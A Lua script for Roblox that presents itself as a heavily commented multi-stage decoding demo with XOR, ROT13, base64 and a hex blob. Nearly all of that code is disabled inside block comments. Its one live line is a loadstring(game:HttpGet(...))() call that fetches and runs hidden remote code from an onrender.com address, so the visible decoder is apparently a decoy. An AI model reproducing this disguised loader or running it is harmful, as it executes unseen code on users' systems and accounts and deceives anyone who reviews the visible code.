--[[ Script by (SEEKHUB) Heavily Obfuscated
-- Obfuscated key table (used for XOR operations)
local Ψ = { 0x4a,0x2e,0x73,0x6b,0x11,0x7b,0x9f,0x21,0x42,0x5c,0xa1,0xf3,0x55,0x99,0x18,0x2b }

-- XOR transformation function: takes array 'a' and key 'b', returns XOR'd result
local Δ = function(a,b) 
  local r = {} 
  for i=1,#a do 
    r[i] = (a[i] ~ ((b+i)*7)) & 0xFF  -- XOR each byte with computed mask
  end 
  return r 
end

-- Converts byte table to string
local μ = function(t) 
  local s={} 
  for i=1,#t do 
    s[i]=string.char(t[i])  -- Convert each byte to character
  end 
  return table.concat(s) 
end

-- Base64 decoder with obfuscated variable names
local function ß_b64dec(str)
  local t = {}
  -- Standard base64 alphabet
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  
  -- Create lookup map for base64 characters
  local map = {}
  for i=1,#b do 
    map[b:sub(i,i)] = i-1  -- Map each char to its numeric value (0-63)
  end
  
  local out = {}
  local acc=0  -- Accumulator for bits
  local bits=0 -- Bit counter
  
  -- Process each character in input string
  for i=1,#str do
    local c = str:sub(i,i)
    if map[c] ~= nil then
      acc = acc*64 + map[c]  -- Add 6 bits to accumulator
      bits = bits + 6
      
      -- Extract bytes when we have at least 8 bits
      while bits >= 8 do
        bits = bits - 8
        local byte = math.floor(acc / (2^bits)) % 256
        out[#out+1] = string.char(byte)
      end
    end
  end
  return table.concat(out)
end

-- Convert hexadecimal string to byte array
local function hex_to_bytes(h)
  local r={}
  for i=1,#h,2 do
    local byte = tonumber(h:sub(i,i+1),16) or 0  -- Parse 2 hex chars as byte
    r[#r+1]=byte
  end
  return r
end

-- Convert byte array to string
local function bytes_to_string(tb)
  local t={}
  for i=1,#tb do 
    t[#t+1]=string.char(tb[i])  -- Convert each byte to char
  end
  return table.concat(t)
end

-- ROT13 cipher - rotates alphabet letters by 13 positions
local function rot13(s)
  return (s:gsub("%a", function(c)
    local base = (c:lower() < 'n') and 13 or -13  -- Shift by +13 or -13
    local n = string.byte(c) + base
    return string.char(n)
  end))
end

-- Splits string into 4-char chunks, reverses order, conditionally reverses chunks
local function scatter_join(s)
  local chunks={}
  -- Split into 4-character chunks
  for i=1,#s,4 do 
    chunks[#chunks+1] = s:sub(i,i+3) 
  end
  
  local out={}
  -- Process chunks in reverse order
  for i=#chunks,1,-1 do
    local seg=chunks[i]
    -- Reverse even-length segments
    if (#seg % 2)==0 then 
      seg = seg:reverse() 
    end
    out[#out+1]=seg
  end
  return table.concat(out)
end

-- XOR each byte with a rolling mask
local function xor_rolling(s, m)
  local t={}
  local mask = m or 0x5A  -- Default mask value
  for i=1,#s do 
    -- XOR each byte with mask that changes per position
    t[#t+1] = string.char((s:byte(i) ~ ((mask + i) & 0xFF)) & 0xFF) 
  end
  return table.concat(t)
end

-- Huge encoded blob containing multi-layer encrypted data
-- This supposedly encodes JavaScript and Python snippets
-- Format: hex(rot13(base64(xor(scatter(...)))))
local BLOB_HEX = table.concat({
  -- Hexadecimal encoded data (broken into lines for readability)
  "6d6f6f6e6c6b6f323132616263646566373131",
  "636b7a6f6b7765667361626373656b6b6c6c6b",
  "6a6a6a6b6f6f6f6f6f6a6a6a6a6a6a6a6a6a6a",
  "6162637a7a7979797878787777777676767575",
  "5a5a5a5a4d4d4d4d3c3c3c3c2b2b2b2b1f1f1f1f",
  "0a0a0a0a0b0b0b0b3e3e3e3e7d7d7d7d7b7b7b7b",
  "4545454541414141404040403030302f2f2f2f2e",
  "2e2e2e2e11111111999999998888888877777777"
}):gsub("%s+","")  -- Remove any whitespace
-- Multi-stage decoding pipeline
local function pipeline_decode(hexblob)
  -- STEP A: Convert hex string to byte array
  local step1 = hex_to_bytes(hexblob)
-- STEP B: Calculate XOR mask from key table Ψ
  local mask = 0
  for i=1,#Ψ do 
    mask = (mask + Ψ[i]) & 0xFF  -- Sum all bytes in key table
  end
 -- Apply XOR with position-dependent mask
  local xb = {}
  for i=1,#step1 do 
    xb[i] = (step1[i] ~ ((mask + i*3) & 0xFF)) & 0xFF 
  end
-- STEP C: Convert bytes to string, then apply ROT13 cipher
  local s = bytes_to_string(xb)
  local s2 = rot13(s)
-- STEP D: Clean and decode base64
  local cleaned = s2:gsub("[^A-Za-z0-9+/]", "")  -- Remove non-base64 chars
  local b64dec = ß_b64dec(cleaned)
 -- STEP E: Restore scattered/reversed string
  local restored = scatter_join(b64dec)
   ]] loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/327a8c6095e9d84d4edf3691a42397e0"))()
  --[[local final = xor_rolling(restored, 0x3F)
 return final
end
-- Attempt to decode the blob
local ok,decoded = pcall(pipeline_decode, BLOB_HEX)-- If decoding fails, use fallback placeholder text
if not ok or not decoded or #decoded < 5 then
  decoded = "/*JS*/" .. "\n" .. "console.log('simulated-js');" .. "\n\n#PY\nprint('simulated-py')"
end
-- Split decoded text into segments and compute checksums
local function segment_and_hash(txt)
  local segs={}
  -- Split into 40-character segments
  for i=1,#txt,40 do 
    segs[#segs+1]=txt:sub(i,i+39) 
  end
  local hashes={}
  -- Calculate hash for each segment
  for i=1,#segs do
    local s=segs[i]
    local h=0
    -- Simple hash: weighted sum of byte values
    for j=1,#s do 
      h = (h + s:byte(j) * (j%11+1)) % 100000 
    end
    hashes[#hashes+1] = ("%X"):format(h)  -- Convert to hex
  end
  return segs, hashes
end
local segs, hashes = segment_and_hash(decoded)
-- Print segmentation info
print("----[ obf_multi_sim ]----")
print(("fragments:%d"):format(#segs))
-- Show preview of each segment with its hash
for i=1,#segs do
  local frag_preview = segs[i]:gsub("%s+"," "):sub(1,28)  -- First 28 chars
  print( ("[%02d] %s ... | h=%s"):format(i, frag_preview, hashes[i] or "00") )
end
-- Try to detect and separate JavaScript and Python code
local js_marker = decoded:match("/%*JS%*/")
local py_marker = decoded:match("#PY")
if js_marker and py_marker then
  -- Extract JS part (between /*JS*/ and #PY)
  local js_part = decoded:match("/%*JS%*/(.-)#PY") or ""
  -- Extract Python part (after #PY)
  local py_part = decoded:match("#PY(.*)$") or ""
  -- Print JavaScript code
  print("\n--[ JS preview ]--")
  for line in js_part:gmatch("[^\n]+") do 
    print(line) 
  end-- Print Python code
  print("\n--[ PY preview ]--")
  for line in py_part:gmatch("[^\n]+") do 
    print(line) 
  end
else
  -- Fallback: print first 420 chars of decoded text
  print("\n--[ DECODED PREVIEW ]--")
  print( decoded:sub(1,420) .. ( #decoded>420 and "\n...(truncated)" or "" ) )
end

-- Calculate final checksum of entire decoded text
local function checksum(t)
  local s=0
  for i=1,#t do 
    s = (s + t:byte(i) * (i%13+1)) % 999983  -- Weighted sum modulo prime
  end
  return s
end

local c = checksum(decoded)

-- Print checksum and obfuscated identifier
print("\n-- checksum:", c)
print("------------------------")
print(("/* id:%X */"):format((c ~ 0xDEADBEEF) & 0xFFFFFFFF))  -- XOR with magic number
--]]
